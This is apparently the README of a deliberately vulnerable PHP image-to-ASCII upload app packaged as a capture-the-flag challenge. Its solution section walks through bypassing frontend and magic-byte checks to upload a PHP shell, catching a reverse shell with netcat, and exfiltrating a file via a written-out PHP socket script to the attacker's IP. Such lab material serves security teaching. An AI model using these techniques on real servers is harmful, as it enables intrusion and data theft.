# PHP Web Vulnerable Project

This is a **simple PHP web application** that allows users to upload an image and convert it into ASCII art. The project demonstrates basic image upload functionality with a frontend and backend component.

### Key Features:

- **Frontend Image Controller**: A JavaScript validation (`image-validation.js`) ensures that only image files are selected before uploading.
- **Backend Image Controller**: On the server side, PHP uses **Magic Bytes** validation to ensure the uploaded file is actually an image before processing it.
- **Whitelist and Blacklist Filtering**: The uploaded file is checked against a whitelist and a blacklist to ensure it is an allowed file type. If the file is not explicitly allowed, additional checks are performed to inspect its magic bytes to verify it as a valid image.

---

## How It Works:

### 1. **Frontend Validation** (via `image-validation.js`):
When a user selects a file for upload, the `image-validation.js` script ensures that the selected file is an image (e.g., PNG, JPG). If the selected file passes this check, it is allowed for upload.

### 2. **Backend Validation**:
When the user clicks the **Upload** button, the file is sent to the server where it undergoes multiple checks:

- **Whitelist Check**: The file's extension is checked against a predefined list of allowed image extensions (`png`, `jpg`, `jpeg`, `bmp`, `gif`, `webp`). If the extension is in the whitelist, the file passes this check.
  
- **Blacklist Check**: If the file's extension is **not** in the whitelist, it is checked against a blacklist of dangerous or disallowed file types (e.g., `php`, `exe`, `zip`, `pdf`). If the file is on the blacklist, the upload is rejected.
  
- **Magic Bytes Check**: If the file is not on the whitelist or blacklist, the server checks the file’s **magic bytes** to ensure that the file is a valid image type. If the magic bytes do not match any of the allowed image MIME types (e.g., `image/jpeg`, `image/png`), the upload is rejected.

### 3. **Uploading the File**:
If the file passes all checks (whitelist, blacklist, and magic bytes validation), it is saved to the server in the `uploads/` directory. An ASCII representation of the image is then generated and saved to the `ascii_output/` directory. This ASCII representation is created using the `jp2a` command.

---

## Installation

To quickly set up and run this project, you can use Docker. The project is packaged as a Docker image available on Docker Hub.

### Steps to Install and Run with Docker:

1. **Pull the Docker Image**  
   To pull the Docker image for this project, use the following command:

   ```bash
   docker pull coduronin/web-ctf

2. **Run the Docker Container**  
   Once the image is pulled, run the container using this command:

   ```bash
   docker run -p 8080:80 coduronin/web-ctf

## Solution

To successfully retrieve the flag, follow these steps:

1. **Bypass Frontend Validation**:
   - Open **Burp Suite** and intercept the HTTP request.
   - Delete the `image-validation.js` file from the request to bypass the frontend image validation, allowing non-image files (such as a PHP shell) to be selected.

2. **Upload the PHP Shell**:
   - Choose a **PHP shell** with a `.phtml` extension. Normally, the file would be rejected, but after removing the frontend validation, you can now upload it.
   - Before uploading, modify the **magic bytes** of the file to make it appear as an image. A simple way is to add `GIF8` at the beginning of the file using Burp Suite (this mimics the magic bytes of an image file).

3. **Execute the Payload**:
   - Once the PHP shell is uploaded, set up a **listener** on your own machine to catch the reverse shell:
   
     ```bash
     nc -lvnp <your-port>
     ```

4. **Find the Flag**:
   - On the compromised system, navigate to the `/home` directory where you will find the `flag.pmg` file.
   - Copy the `flag.pmg` file to the `/tmp` directory for easier access:
   
     ```bash
     cp /home/flag.pmg /tmp/
     ```

5. **Transfer the Flag to Your Machine**:
   - On your machine, open a **netcat listener** to receive the file:
   
     ```bash
     nc -lvnp <your-port> > received_file.pmg
     ```

   - On the compromised machine, create and execute a simple PHP script to send the `flag.pmg` file to your machine:
   
     ```php
     echo "<?php
     \$host = 'IP';  // Replace with your machine's IP address
     \$port = port;  // Port to send the file on

     
     \$file = '/tmp/flag.pmg';  
     \$fp = fopen(\$file, 'rb');

     if (\$fp === false) {
         die('Failed to open file.');
     }

     // Create a socket connection
     \$socket = fsockopen(\$host, \$port);

     if (!\$socket) {
         die('Failed to connect to \$host:\$port.');
     }

     // Read the file and send it over the socket
     while (!feof(\$fp)) {
         \$data = fread(\$fp, 1024);  
         fwrite(\$socket, \$data);  
     }

     fclose(\$fp);
     fclose(\$socket);

     echo 'File sent successfully!';
     ?>" > send.php
     ```

6. **Fix the Magic Bytes**:
   - After receiving the `flag.pmg` file on your local machine, it may not be a valid PNG image due to the incorrect magic bytes. Modify the magic bytes of the file to match the correct PNG header (`89 50 4E 47 0D 0A 1A 0
   - Once the magic bytes are corrected, you can open the file as an image and view the flag.
By following these steps, you will successfully retrieve the flag from the compromised system.





